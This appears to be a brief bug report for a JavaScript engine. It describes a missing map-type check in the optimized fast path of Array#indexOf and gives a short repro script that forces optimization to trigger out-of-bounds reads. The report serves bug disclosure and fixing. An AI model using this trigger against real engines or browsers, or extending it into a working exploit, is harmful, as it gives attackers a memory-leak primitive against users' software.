Fast-path of Array#indexOf does not check map type, this allows OOB reads.

Repro:

const o = {x:9};
o.__proto__ = Array.prototype;

function foo(o) {
  return o.indexOf(undefined);
}
print(foo(o));
print(foo(o));
%OptimizeFunctionOnNextCall(foo);
print(foo(o));
